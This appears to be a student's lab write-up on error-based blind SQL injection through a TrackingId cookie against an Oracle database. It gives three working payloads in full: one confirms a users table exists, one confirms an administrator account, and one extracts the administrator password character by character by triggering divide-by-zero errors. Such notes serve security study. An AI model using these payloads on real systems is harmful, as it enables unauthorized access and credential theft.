# SQLi with cond variables

We use the trackingID parameter of the HTTP request (which is used in a SQL query) to figure out details of the database by simply doing something then checking for errors

# Method

1. TrackingId=kyDY0I1mLYL6r9yM' || (select '' from users where rownum = 1) ||'

This basically just checks if the table users actually exists in the database. NOTE: because we needed to add the FROM part of the query means we are most likely dealing with ORACLE based DB.

2. TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'

It is important to note in that query that the FROM users WHERE username=administrator is CHECKED FIRST. so then if there is a user with 'administrator username' then we will eventually divide by 0 (this giving us an error) SOOOO when we get an error everything after our "FROM" clause is true and exists.

'||(SELECT CASE WHEN substr(password,(index position of password your checking for),1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'

We use a query of this form in order to test at each invidual index of the password what the letter is.
